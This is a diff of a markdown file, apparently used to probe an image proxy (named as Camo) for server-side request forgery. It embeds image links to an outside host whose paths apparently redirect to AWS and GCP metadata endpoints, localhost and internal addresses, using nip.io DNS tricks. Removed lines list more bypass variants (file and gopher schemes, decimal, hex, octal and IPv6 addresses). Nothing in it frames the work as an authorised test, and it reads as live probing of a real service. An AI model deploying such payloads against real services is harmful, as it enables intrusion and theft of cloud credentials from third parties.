@@ -1,55 +1,26 @@
-# SSRF Test v61
+# SSRF Test v62 - nip.io DNS Bypass
 
-## AWS Metadata Redirect Test
+Testing if Camo follows redirects to nip.io domains that resolve to internal IPs.
 
-![AWS Metadata](http://164.90.187.218.nip.io:9999/aws)
+## AWS Metadata via nip.io (169.254.169.254.nip.io)
+![AWS nip.io](http://164.90.187.218.nip.io:9999/aws?v=62)
 
-## GCP Metadata Redirect Test
+## Localhost via nip.io (127.0.0.1.nip.io)
+![Localhost nip.io](http://164.90.187.218.nip.io:9999/localhost?v=62)
 
-![GCP Metadata](http://164.90.187.218.nip.io:9999/gcp)
+## Internal via nip.io (10.0.0.1.nip.io)
+![Internal nip.io](http://164.90.187.218.nip.io:9999/internal?v=62)
 
-## Azure Metadata Redirect Test
-
-![Azure Metadata](http://164.90.187.218.nip.io:9999/azure)
-
-## Localhost Redirect Test
-
-![Localhost](http://164.90.187.218.nip.io:9999/localhost)
-
-## Internal IP Redirect Test
-
-![Internal](http://164.90.187.218.nip.io:9999/internal)
-
-## IMDS Redirect Test
-
-![IMDS](http://164.90.187.218.nip.io:9999/imds)
-
-## File Protocol Test
-
-![File](http://164.90.187.218.nip.io:9999/file)
-
-## Gopher Protocol Test
-
-![Gopher](http://164.90.187.218.nip.io:9999/gopher)
-
-## Decimal IP Test
-
-![Decimal](http://164.90.187.218.nip.io:9999/decimal)
-
-## Hex IP Test
-
-![Hex](http://164.90.187.218.nip.io:9999/hex)
-
-## Octal IP Test
-
-![Octal](http://164.90.187.218.nip.io:9999/octal)
-
-## IPv6 Test
-
-![IPv6](http://164.90.187.218.nip.io:9999/ipv6)
+## GCP Metadata (metadata.google.internal)
+![GCP](http://164.90.187.218.nip.io:9999/gcp?v=62)
 
 ## Chain Redirect Test
+![Chain](http://164.90.187.218.nip.io:9999/chain?v=62)
 
-![Chain](http://164.90.187.218.nip.io:9999/chain)
+## Control: Raw AWS IP (should be blocked)
+![AWS Raw](http://164.90.187.218.nip.io:9999/awsraw?v=62)
 
-Timestamp: 2026-01-12T14:51:00Z
+## Control: Raw Localhost (should be blocked)
+![Localhost Raw](http://164.90.187.218.nip.io:9999/localraw?v=62)
+
+Timestamp: 2026-01-12T15:15:00Z
